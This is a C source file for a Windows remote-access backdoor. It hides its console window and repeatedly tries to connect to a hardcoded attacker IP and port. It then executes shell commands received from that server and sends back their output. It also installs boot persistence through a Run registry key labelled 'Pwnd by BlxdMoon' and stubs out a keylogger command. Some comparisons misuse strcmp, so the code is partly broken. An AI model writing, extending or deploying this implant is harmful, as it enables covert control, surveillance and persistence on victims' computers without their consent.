#include "status.h"
#include "str_cut.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <Windows.h>
#include <WinUser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

// Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

#define bzero(p, size) (void)memset((p), 0, (size))

// Define Socket
int sock;

int bootRun()
{
  // Initialize variables
  char err[128] = "Failed to create Persistence.\n";
  char suc[128] = "Successfully added Persistence at: Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
  TCHAR szPath[MAX_PATH];
  DWORD pathLen = 0;

  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

  if (pathLen == 0)
  {
    // An error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Handle to open registry key
  HKEY NewVal;

  // Open regkey
  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
  {
    // An other error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
  if (RegSetValueEx(NewVal, TEXT("Pwnd by BlxdMoon"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
  {
    // Couldn't create key
    RegCloseKey(NewVal);
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Successfully added Persistence
  RegCloseKey(NewVal);
  send(sock, suc, sizeof(suc), 0);

  return 0;
}

void Shell()
{
  // The command which we receive from the server
  char buffer[1024];
  char container[1024];
  char total_response[18384];

  while (1)
  {
    // Clear variables
    bzero(buffer, sizeof(buffer));
    bzero(container, sizeof(container));
    bzero(total_response, sizeof(total_response));

    // Receive command from server
    recv(sock, buffer, 1024, 0);

    if (strncmp("q", buffer, 1) == 0) // Use strncmp for comparing a specific number of characters
    {
      // info("Quitting Connection..");
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else if (strncmp("start:keylogger", buffer, sizeof("start:keylogger")) == 0)
    {
      info("Starting Keylogger..");

      // IMPLEMENT KEYLOGGER
    }
    else if (strcmp("cd ", buffer, sizeof("cd ")) == 0)
    {
      // Get the directory from the original buffer
      char *str = str_cut(buffer, 3, 100);

      // Change directory
      chdir(str);

      // Send response
      send(sock, "Directory changed.", sizeof("Directory changed."), 0);
    }
    else if (strcmp("persist", buffer, sizeof("persist")) == 0)
    {
      // Persist connection
      bootRun();
    }
    else
    {
      // Open a file description to execute system commands
      FILE *fp = _popen(buffer, "r");
      while (fgets(container, 1024, fp) != NULL)
      {
        // Concatenate response to total_response
        strcat(total_response, container);
      }

      // Send the response to the server
      send(sock, total_response, sizeof(total_response), 0);

      // Close fp
      fclose(fp);
    }
  }
}

// Function to establish the connection
int EstablishConnection(const char *ServIp, unsigned short ServPort)
{
  struct sockaddr_in ServAddr;

  // Initialize Socket (Use IPv4, TCP)
  sock = socket(AF_INET, SOCK_STREAM, 0);

  // Check if socket creation failed
  if (sock == INVALID_SOCKET)
  {
    // error("Socket creation failed");
    return 1;
  }

  // Clear
  memset(&ServAddr, 0, sizeof(ServAddr));

  // Reset config
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.S_un.S_addr = inet_addr(ServIp);
  ServAddr.sin_port = htons(ServPort);

  // Connect every 5 seconds
  while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
  {
    Sleep(5);
  }

  return 0; // Connection established successfully
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  if (hPrev != 0)
  {
    // error("hPrev should be 0.");
    return 1;
  }

  // Run without showing CMD window
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);

  // Define variables
  char *ServIp = "192.168.1.21";
  unsigned short ServPort = 6709;

  // Check if WinSock is ready
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
  {
    // error("Couldn't initiate WinSock.");
    exit(1);
  }

  // Establish connection
  if (EstablishConnection(ServIp, ServPort) != 0)
  {
    // Handle connection failure
    // error("Coudln't establish connection.");
    return 1;
  }

  // Enter into Shell
  Shell();

  // Close the socket when done
  closesocket(sock);

  return 0;
}
